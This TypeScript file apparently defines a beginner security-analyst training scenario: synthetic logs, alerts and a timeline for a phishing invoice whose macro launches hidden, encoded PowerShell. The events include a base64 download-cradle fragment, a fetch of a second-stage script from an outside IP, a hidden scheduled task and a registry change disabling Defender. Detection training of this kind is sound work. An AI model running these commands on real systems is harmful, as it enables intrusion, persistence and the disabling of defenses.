import type { Scenario } from "../../types";
import { ScenarioEvents, addNoise, STANDARD_USERS } from "./builder";

/** Scenario 2 — phishing email → macro → encoded PowerShell → persistence (beginner/intermediate). */
function build(): Scenario {
  const ev = new ScenarioEvents("PH");
  addNoise(ev, { start: "2026-05-07 10:00:00", minutes: 50, count: 60, seed: 22, users: STANDARD_USERS });

  const mail = ev.add({ time: "2026-05-07 10:04:12", index: "email", sourcetype: "ms:o365:messagetrace", host: "o365",
    fields: { sender: "billing@invoice-secure.co", recipient: "a.kumar@corp.local", subject: "Overdue invoice #88412", attachment: "Invoice_88412.docm", action: "delivered", spf: "fail" },
    mitre: ["T1566.001"], risk: { object: "a.kumar", objectType: "user", score: 20, rule: "Email - Macro Attachment From New Domain" } });
  ev.add({ time: "2026-05-07 10:04:13", index: "email", sourcetype: "ms:o365:messagetrace", host: "o365",
    fields: { sender: "billing@invoice-secure.co", recipient: "r.patel@corp.local", subject: "Overdue invoice #88412", attachment: "Invoice_88412.docm", action: "quarantined", spf: "fail" } });
  const open = ev.add({ time: "2026-05-07 10:11:40", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-hr-07",
    fields: { EventCode: 1, user: "a.kumar", process: "WINWORD.EXE", parent_process: "explorer.exe", CommandLine: "WINWORD.EXE /n C:\\Users\\a.kumar\\Downloads\\Invoice_88412.docm" } });
  const ps = ev.add({ time: "2026-05-07 10:11:52", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-hr-07",
    fields: { EventCode: 1, user: "a.kumar", process: "powershell.exe", parent_process: "WINWORD.EXE", CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" },
    mitre: ["T1059.001"], risk: { object: "ws-hr-07", objectType: "system", score: 60, rule: "Endpoint - Office Spawning PowerShell" } });
  const dl = ev.add({ time: "2026-05-07 10:11:55", index: "proxy", sourcetype: "bluecoat:proxysg", host: "proxy01",
    fields: { user: "a.kumar", src_ip: "10.0.3.7", url: "http://185.220.101.4/p.ps1", http_method: "GET", status: 200, bytes_out: 310, bytes_in: 48211, category: "Uncategorized" },
    mitre: ["T1071.001"] });
  const net = ev.add({ time: "2026-05-07 10:11:55", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-hr-07",
    fields: { EventCode: 3, user: "a.kumar", process: "powershell.exe", dest_ip: "185.220.101.4", dest_port: 80, protocol: "tcp" } });
  const task = ev.add({ time: "2026-05-07 10:12:30", index: "wineventlog", sourcetype: "WinEventLog:Security", host: "ws-hr-07",
    fields: { EventCode: 4698, user: "a.kumar", TaskName: "\\OneDriveUpdateCheck", TaskCommand: "powershell.exe -w hidden -f C:\\ProgramData\\odu.ps1" },
    mitre: ["T1053.005"], risk: { object: "ws-hr-07", objectType: "system", score: 40, rule: "Endpoint - Suspicious Scheduled Task" } });
  const def = ev.add({ time: "2026-05-07 10:12:41", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-hr-07",
    fields: { EventCode: 13, user: "a.kumar", process: "powershell.exe", TargetObject: "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", Details: "DWORD (0x00000001)" },
    mitre: ["T1562.001"], risk: { object: "ws-hr-07", objectType: "system", score: 50, rule: "Endpoint - Defender Disabled via Registry" } });
  // Benign PowerShell by IT for contrast
  ev.add({ time: "2026-05-07 10:20:05", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-eng-04",
    fields: { EventCode: 1, user: "m.lee", process: "powershell.exe", parent_process: "explorer.exe", CommandLine: "powershell.exe Get-ChildItem C:\\Projects" } });

  return {
    id: "phish-powershell",
    name: "Phishing → Malicious Macro → PowerShell",
    tagline: "An invoice that runs code the moment it is opened.",
    difficulty: "beginner",
    attackStory: [
      "a.kumar receives 'Overdue invoice #88412' from a look-alike domain; SPF fails but it is delivered.",
      "She opens the macro-enabled document — WINWORD.EXE launches a hidden, encoded PowerShell.",
      "PowerShell downloads a second-stage script from 185.220.101.4.",
      "The script creates a scheduled task for persistence and disables Microsoft Defender.",
    ],
    events: ev.all(),
    notables: [
      { id: "ACAD-NOT-2001", title: "Endpoint - Office Application Spawning PowerShell (ws-hr-07)", urgency: "high", rule: "Endpoint - Office Spawning PowerShell", entity: "ws-hr-07",
        description: "WINWORD.EXE spawned powershell.exe with -enc and -w hidden.", eventIds: [open, ps],
        recommendedActions: ["Isolate ws-hr-07 via EDR", "Decode the PowerShell payload", "Purge the email from all mailboxes", "Block 185.220.101.4 and invoice-secure.co"] },
      { id: "ACAD-NOT-2002", title: "Endpoint - Defender Disabled via Registry (ws-hr-07)", urgency: "high", rule: "Endpoint - Defense Evasion", entity: "ws-hr-07",
        description: "Registry value DisableAntiSpyware set to 1 by powershell.exe.", eventIds: [def], recommendedActions: ["Re-enable Defender", "Hunt for the same registry change fleet-wide"] },
    ],
    intel: [
      { indicator: "185.220.101.4", type: "ip", threat: "Malware staging server (loader)", source: "AlienVault OTX", confidence: 80, eventIds: [dl, net] },
      { indicator: "invoice-secure.co", type: "domain", threat: "Phishing kit domain registered 3 days ago", source: "MISP - corp-intel", confidence: 75, eventIds: [mail] },
    ],
    entities: [
      { type: "user", value: "a.kumar", role: "victim", note: "Opened the malicious attachment." },
      { type: "host", value: "ws-hr-07", role: "compromised", note: "Ran the macro, PowerShell, task and registry change." },
      { type: "domain", value: "invoice-secure.co", role: "attacker", note: "Sender domain — SPF failed." },
      { type: "ip", value: "185.220.101.4", role: "attacker", note: "Served the second-stage script." },
      { type: "user", value: "r.patel", role: "benign", note: "Same email was quarantined — no impact." },
      { type: "host", value: "ws-eng-04", role: "benign", note: "Normal admin PowerShell (Get-ChildItem) — not malicious." },
    ],
    mitreMap: [
      { techniqueId: "T1566.001", evidence: "Macro-enabled attachment from a look-alike domain.", eventIds: [mail] },
      { techniqueId: "T1059.001", evidence: "Hidden, encoded PowerShell launched by WINWORD.EXE.", eventIds: [ps] },
      { techniqueId: "T1053.005", evidence: "Scheduled task \\OneDriveUpdateCheck runs a hidden script.", eventIds: [task] },
      { techniqueId: "T1562.001", evidence: "DisableAntiSpyware registry value set to 1.", eventIds: [def] },
    ],
    timeline: [
      { phase: "Phish delivered", tacticId: "TA0001", summary: "Invoice email reaches a.kumar.", eventIds: [mail] },
      { phase: "Macro runs code", tacticId: "TA0002", summary: "Word → PowerShell → download.", eventIds: [open, ps, dl] },
      { phase: "Stays on the machine", tacticId: "TA0003", summary: "Scheduled task created.", eventIds: [task] },
      { phase: "Hides from defenders", tacticId: "TA0005", summary: "Defender disabled.", eventIds: [def] },
    ],
    patientZero: { entity: "ws-hr-07", explanation: "ws-hr-07 is the first machine that executed attacker code, after a.kumar opened the attachment." },
  };
}

export const PHISH_POWERSHELL = build();
